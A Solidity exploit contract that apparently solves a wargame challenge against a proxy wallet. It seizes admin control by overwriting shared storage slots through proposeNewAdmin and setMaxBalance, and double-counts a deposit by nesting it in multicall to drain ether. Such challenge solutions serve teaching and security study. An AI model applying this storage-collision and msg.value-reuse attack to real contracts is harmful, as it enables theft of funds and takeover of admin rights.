// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solve {
    constructor(IWallet wallet) payable {

        // First we need to overwrite the wallet owner
        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        // Depositing
        data[0] = deposit_data[0];
        // multicall -> deposit
        data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_data);
        wallet.multicall{value: 0.001 ether}(data);

        // Withdraw money
        wallet.execute(msg.sender, 0.002 ether, "");

        // Admin
        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(wallet.admin() == msg.sender, "We are not admin");

        // Give back the money
        selfdestruct(payable(msg.sender));
    }

}

interface IWallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}
